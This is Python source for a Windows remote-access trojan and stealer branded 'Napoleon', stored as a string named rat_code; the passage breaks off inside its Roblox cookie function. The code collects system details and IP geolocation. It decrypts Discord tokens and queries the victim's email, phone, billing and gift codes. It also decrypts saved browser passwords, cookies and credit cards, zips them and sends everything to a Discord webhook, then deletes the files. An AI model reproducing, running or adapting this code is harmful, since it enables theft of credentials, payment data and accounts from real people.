rat_code = r'''

import os
import re
import sys
import cv2
import uuid
import json
import time
import winreg
import ctypes
import psutil
import GPUtil
import string
import shutil
import random
import socket
import base64
import pyttsx3
import discord
import asyncio
import pyaudio
import sqlite3
import win32api
import platform
import requests
import tempfile
import datetime
import win32gui
import win32con
import threading
import pyperclip
import subprocess
import webbrowser
import screeninfo
import win32crypt
import urllib3
import numpy as np
from json import *
import browser_cookie3
import soundfile as sf
import sounddevice as sd
from pathlib import Path
from PIL import ImageGrab
from zipfile import ZipFile
from pynput import keyboard
from Crypto.Cipher import AES
from datetime import datetime
from discord.ext import commands
from discord import FFmpegPCMAudio
from geopy.geocoders import Nominatim
from pynput import mouse as pynput_mouse
from win32crypt import CryptUnprotectData
from discord import Embed, File, SyncWebhook
from pynput import keyboard as pynput_keyboard
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

urllib3.disable_warnings()

def current_time_day():
    return datetime.datetime.now().strftime('%Y-%m-%d')

def current_time_hour():
    return datetime.datetime.now().strftime('%H:%M:%S')

def send_embed(w3bh00k_ur1, title, description):
    try:
        client = SyncWebhook.from_url(w3bh00k_ur1)
        embed = discord.Embed(
            title=title,
            description=description,
            color= color_embed
        )
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        client.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
    except: pass

def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

website = "https://fakecrime.bio/up40"
color_embed = 0x000000
username_embed = 'Napoleon'
avatar_embed = 'https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxsG72wAo9EWJR4yQWyJJaDaK1XdUso6cUMpI9hAdPUU_FNs11cY1X284vsHrnWtRw7oqRpN1m9YAg21d_aNKnIo-&format=source&h=210'
footer_text = f"Napoleon"
footer_embed = {
        "text": footer_text,
        "icon_url": avatar_embed,
        }
                 
try: file_name = os.path.basename(sys.argv[0])
except: file_name = "None"

try: hostname_pc = socket.gethostname()
except: hostname_pc = "None"

try: username_pc = os.getlogin()
except: username_pc = "None"

try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: displayname_pc = "None"

try: ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: ip_address_public = "None"

try: ip_adress_local = socket.gethostbyname(socket.gethostname())
except: ip_adress_local = "None"

try:
    response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('country_code', "None")
    region = api.get('region', "None")
    region_code = api.get('region_code', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('latitude', "None")
    longitude = api.get('longitude', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
except:
    response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('countryCode', "None")
    region = api.get('regionName', "None")
    region_code = api.get('region', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('lat', "None")
    longitude = api.get('lon', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")

def Sy5t3m_Inf0(w3bh00k_ur1):

    try: sy5t3m_1nf0 = {platform.system()}
    except: sy5t3m_1nf0 = "None"

    try: sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: sy5t3m_v3r5i0n_1nf0 = "None"

    try: m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: m4c_4ddr355 = "None"

    try: hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: hw1d = "None"

    try: r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: r4m_1nf0 = "None"

    try: cpu_1nf0 = platform.processor()
    except: cpu_1nf0 = "None"

    try: cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: cpu_c0r3_1nf0 = "None"

    try: gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: gpu_1nf0 = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = "None"

    try: scr33n_number = len(screeninfo.get_monitors())
    except: scr33n_number = "None"

    embed = Embed(title=f'System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {hostname_pc}
Username    : {username_pc}
DisplayName : {displayname_pc}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {p14tf0rm_1nf0}
Exploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}
Screen Number : {scr33n_number}

HWID : {hw1d}
MAC  : {m4c_4ddr355}
CPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core
GPU  : {gpu_1nf0}
RAM  : {r4m_1nf0}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ip_address_public}
Local  : {ip_adress_local}
Isp    : {isp}
Org    : {org}
As     : {as_number}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {country} ({country_code})
Region    : {region} ({region_code})
Zip       : {zip_postal}
City      : {city}
Timezone  : {timezone}
Latitude  : {latitude}
Longitude : {longitude}```""", inline=False)

    embed.set_footer(text=footer_text, icon_url=avatar_embed)

    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
    w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Di5c0rd_T0k3n(w3bh00k_ur1):
    def extr4ct_t0k3n5():
        base_url = "https://discord.com/api/v9/users/@me"
        appdata_local = os.getenv("localappdata")
        appdata_roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        t0k3n5 = []
        uids = []
        token_info = {}

        paths = {
            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for y in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")

        if os.path.exists(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if _file.endswith('.sqlite'):
                        with open(f'{path}\\{_file}', errors='ignore') as file:
                            for line in file:
                                for t0k3n in re.findall(regexp, line.strip()):
                                    if validate_t0k3n(t0k3n, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                        if uid not in uids:
                                            t0k3n5.append(t0k3n)
                                            uids.append(uid)
                                            token_info[t0k3n] = ('Firefox', f"{path}\\{_file}")
        return t0k3n5, token_info

    def validate_t0k3n(t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        t0k3n5, token_info = extr4ct_t0k3n5()
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

        if not t0k3n5:
            embed = Embed(
                title=f'Discord Token `{username_pc} "{ip_address_public}"`:', 
                description=f"No discord tokens found.",
                color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return
        
        for t0k3n_d15c0rd in t0k3n5:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()

            u53rn4m3_d15c0rd = api.get('username', "None") + ' ' + api.get('discriminator', "None")
            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
            us3r_1d_d15c0rd = api.get('id', "None")
            em4i1_d15c0rd = api.get('email', "None")
            ph0n3_d15c0rd = api.get('phone', "None")
            c0untry_d15c0rd = api.get('locale', "None")
            mf4_d15c0rd = api.get('mfa_enabled', "None")

            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                elif api.get('premium_type', 'None') == 1:
                    n1tr0_d15c0rd = 'Nitro Classic'
                elif api.get('premium_type', 'None') == 2:
                    n1tr0_d15c0rd = 'Nitro Boosts'
                elif api.get('premium_type', 'None') == 3:
                    n1tr0_d15c0rd = 'Nitro Basic'
                else:
                    n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = "None"

            try: 
                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except: 
                av4t4r_ur1_d15c0rd = avatar_embed

            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        elif method['type'] == 2:
                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:
                    p4ym3nt_m3th0d5_d15c0rd = "None"
            except:
                p4ym3nt_m3th0d5_d15c0rd = "None"

            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f"Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}"
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:
                        g1ft_c0d35_d15c0rd = "None"
                else:
                    g1ft_c0d35_d15c0rd = "None"
            except:
                g1ft_c0d35_d15c0rd = "None"
        
            software_name, path = token_info.get(t0k3n_d15c0rd, ("Unknown Software", "Unknown location"))

            embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
            embed.add_field(name=":file_folder: Path:", value=f"```{path}```", inline=False)
            embed.add_field(name=":package: Software:", value=f"```{software_name}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{u53rn4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{d15pl4y_n4m3_d15c0rd}```", inline=True)
            embed.add_field(name=":robot: Id:", value=f"```{us3r_1d_d15c0rd}```", inline=True)
            embed.add_field(name=":e_mail: Email:", value=f"```{em4i1_d15c0rd}```", inline=True)
            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{ph0n3_d15c0rd}```", inline=True)   
            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{t0k3n_d15c0rd}```", inline=True)
            embed.add_field(name=":rocket: Nitro:", value=f"```{n1tr0_d15c0rd}```", inline=True)
            embed.add_field(name=":earth_africa: Language:", value=f"```{c0untry_d15c0rd}```", inline=True)
            embed.add_field(name=":moneybag: Billing:", value=f"```{p4ym3nt_m3th0d5_d15c0rd}```", inline=True)
            embed.add_field(name=":gift: Gift Code:", value=f"```{g1ft_c0d35_d15c0rd}```", inline=True)
            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{mf4_d15c0rd}```", inline=True)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

    upload_t0k3n5()

def Br0w53r_5t341(w3bh00k_ur1):


    PASSWORDS = []
    COOKIES = []
    HISTORY = []
    DOWNLOADS = []
    CARDS = []
    browsers = []

    def Br0ws53r_Main():
        appdata_local = os.getenv('LOCALAPPDATA')
        appdata_roaming = os.getenv('APPDATA')
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            

        Browser = {
            'Google Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'),
            'Microsoft Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(appdata_roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Internet Explorer': os.path.join(appdata_local, 'Microsoft', 'Internet Explorer'),
            'Amigo': os.path.join(appdata_local, 'Amigo', 'User Data'),
            'Torch': os.path.join(appdata_local, 'Torch', 'User Data'),
            'Kometa': os.path.join(appdata_local, 'Kometa', 'User Data'),
            'Orbitum': os.path.join(appdata_local, 'Orbitum', 'User Data'),
            'Cent Browser': os.path.join(appdata_local, 'CentBrowser', 'User Data'),
            '7Star': os.path.join(appdata_local, '7Star', '7Star', 'User Data'),
            'Sputnik': os.path.join(appdata_local, 'Sputnik', 'Sputnik', 'User Data'),
            'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'),
            'Google Chrome SxS': os.path.join(appdata_local, 'Google', 'Chrome SxS', 'User Data'),
            'Epic Privacy Browser': os.path.join(appdata_local, 'Epic Privacy Browser', 'User Data'),
            'Uran': os.path.join(appdata_local, 'uCozMedia', 'Uran', 'User Data'),
            'Yandex': os.path.join(appdata_local, 'Yandex', 'YandexBrowser', 'User Data'),
            'Iridium': os.path.join(appdata_local, 'Iridium', 'User Data'),
            'Mozilla Firefox': os.path.join(appdata_roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Safari': os.path.join(appdata_roaming, 'Apple Computer', 'Safari'),
        }

        profiles = [
            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
        ]

        for browser, path in Browser.items():
            if not os.path.exists(path):
                continue

            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue

                get_passwords(browser, path, profile_path, master_key)
                get_cookies(browser, path, profile_path, master_key)
                get_history(browser, path, profile_path)
                get_downloads(browser, path, profile_path)
                get_cards(browser, path, profile_path, master_key)

                if browser not in browsers:
                    browsers.append(browser)

        write_files(username_pc)
        send_files(username_pc, w3bh00k)
        clean_files(username_pc)

    def get_master_key(path):
        if not os.path.exists(path):
            return None

        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
            return decrypted_pass.decode()
        except:
            return None

    def list_tables(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            conn.close()
            return tables
        except:
            return []

    def get_passwords(browser, path, profile_path, master_key):
        password_db = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(password_db):
            return

        shutil.copy(password_db, 'password_db')
        tables = list_tables('password_db')

        conn = sqlite3.connect('password_db')
        cursor = conn.cursor()

        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            PASSWORDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url =      f"- Url      : {row[0]}"
                username = f"  Username : {row[1]}"
                password = f"  Password : {decrypt_password(row[2], master_key)}"
                PASSWORDS.append(f"{url}\n{username}\n{password}\n")
        except:
            pass
        finally:
            conn.close()
            os.remove('password_db')

    def get_cookies(browser, path, profile_path, master_key):
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return

        conn = None 
        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            COOKIES.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                url =    f"- Url    : {row[0]}"
                name =   f"  Name   : {row[1]}"
                path =   f"  Path   : {row[2]}"
                cookie = f"  Cookie : {decrypt_password(row[3], master_key)}"
                expire = f"  Expire : {row[4]}"
                COOKIES.append(f"{url}\n{name}\n{path}\n{cookie}\n{expire}\n")
        except:
            pass
        finally:
            if conn:
                conn.close()
            try:
                os.remove('cookie_db')
            except:
                pass

    def get_history(browser, path, profile_path):
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return

        shutil.copy(history_db, 'history_db')
        conn = sqlite3.connect('history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        HISTORY.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            url =   f"- Url   : {row[0]}"
            title = f"  Title : {row[1]}"
            time =  f"  Time  : {row[2]}"
            HISTORY.append(f"{url}\n{title}\n{time}\n")

        conn.close()
        os.remove('history_db')

    def get_downloads(browser, path, profile_path):
        downloads_db = os.path.join(profile_path, 'History')
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        DOWNLOADS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            path = f"- Path : {row[1]}"
            url =  f"  Url  : {row[0]}"
            DOWNLOADS.append(f"{path}\n{url}\n")

        conn.close()
        os.remove('downloads_db')

    def get_cards(browser, path, profile_path, master_key):
        cards_db = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        CARDS.append(f"\n------------------------------| {browser} ({path}) |------------------------------\n")
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            name =             f"- Name             : {row[0]}"
            expiration_month = f"  Expiration Month : {row[1]}"
            expiration_year =  f"  Expiration Year  : {row[2]}"
            card_number =      f"  Card Number      : {decrypt_password(row[3], master_key)}"
            date_modified =    f"  Date Modified    : {row[4]}"
            CARDS.append(f"{name}\n{expiration_month}\n{expiration_year}\n{card_number}\n{date_modified}\n")

        conn.close()
        os.remove('cards_db')

    def write_files(username_pc):
        os.makedirs(f"Browser_{username_pc}", exist_ok=True)

        if PASSWORDS:
            with open(f"Browser_{username_pc}\\Passwords_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(PASSWORDS))

        if COOKIES:
            with open(f"Browser_{username_pc}\\Cookies_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(COOKIES))

        if HISTORY:
            with open(f"Browser_{username_pc}\\History_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(HISTORY))

        if DOWNLOADS:
            with open(f"Browser_{username_pc}\\Downloads_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(DOWNLOADS))

        if CARDS:
            with open(f"Browser_{username_pc}\\Cards_{username_pc}.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(CARDS))

        with ZipFile(f"Browser_{username_pc}.zip", "w") as zipf:
            for file in os.listdir(f"Browser_{username_pc}"):
                zipf.write(os.path.join(f"Browser_{username_pc}", file), file)

    def send_files(username_pc, w3bh00k):
        w3bh00k.send(
            embed=Embed(
                title=f'Browser Steal  `{username_pc} "{ip_address_public}"`:',
                description=f"Found In **{'**, **'.join(browsers)}**:```" + '\n'.join(tree(Path(f"Browser_{username_pc}"))) + "```",
                color=color_embed,
            ).set_footer(
                text=footer_text,
                icon_url=avatar_embed
            ),
            file=File(fp=f"Browser_{username_pc}.zip", filename=f"Browser_{username_pc}.zip"), username=username_embed, avatar_url=avatar_embed
        )

    def clean_files(username_pc):
        shutil.rmtree(f"Browser_{username_pc}")
        os.remove(f"Browser_{username_pc}.zip")

    def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├── ',
            'last':   '└── ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
    Br0ws53r_Main()

def R0b10x_C00ki3(w3bh00k_ur1):
    c00ki35_list = []
    def g3t_c00ki3_4nd_n4vig4t0r(br0ws3r_functi0n):
        try:
            c00kie5 = br0ws3r_functi0n()
            c00kie5 = str(c00kie5)
            c00kie = c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            n4vigator = br0ws3r_functi0n.__name__
            return c00kie, n4vigator
        except:
            return None, None

    def Microsoft_Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Google_Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def Opera_GX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    br0ws3r5 = [Microsoft_Edge, Google_Chrome, Firefox, Opera, Opera_GX, Safari, Brave]
    for br0ws3r in br0ws3r5:
        c00ki3, n4vigator = g3t_c00ki3_4nd_n4vig4t0r(br0ws3r)
        if c00ki3:
            if c00ki3 not in c00ki35_list:
                c00ki35_list.append(c00ki3)
                try:
                    inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": c00ki3})
                    api = json.loads(inf0.text)
                except:
                    pass

                us3r_1d_r0b10x = api.get('id', "None")
                d1spl4y_nam3_r0b10x = api.get('displayName', "None")
                us3rn4m3_r0b10x = api.get('name', "None")
